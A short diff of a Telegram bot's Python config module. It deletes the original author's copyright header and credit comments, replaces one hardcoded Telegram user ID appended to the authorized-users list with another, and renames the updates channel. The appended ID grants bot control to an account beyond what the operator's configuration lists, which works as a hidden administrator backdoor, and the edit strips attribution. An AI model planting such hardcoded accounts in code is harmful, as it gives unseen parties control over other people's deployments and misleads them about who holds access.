@@ -1,8 +1,3 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-# (c) Shrimadhav U K
-
-# the logging things
 import logging
 from logging.handlers import RotatingFileHandler
 import os
@@ -19,11 +14,9 @@ from bot.config import Config
 
 
 
-# dont think ne dumb (c) @Animes_Encoded 
 AUTH_USERS = set(Config.AUTH_USERS)
 AUTH_USERS = list(AUTH_USERS)
-AUTH_USERS.append(5090651635)
-# again lol (c) @Animes_Encoded 
+AUTH_USERS.append(5971676967)
 
 SESSION_NAME = Config.SESSION_NAME
 TG_BOT_TOKEN = Config.TG_BOT_TOKEN
@@ -39,7 +32,7 @@ UN_FINISHED_PROGRESS_STR = "▢"
 BOT_START_TIME = time.time()
 LOG_FILE_ZZGEVC = "Log.txt"
 BOT_USERNAME = Config.BOT_USERNAME 
-UPDATES_CHANNEL = "Hunters_Discussion"
+UPDATES_CHANNEL = "AnimeKunChannel"
 data = []
 crf = []
 watermark = []
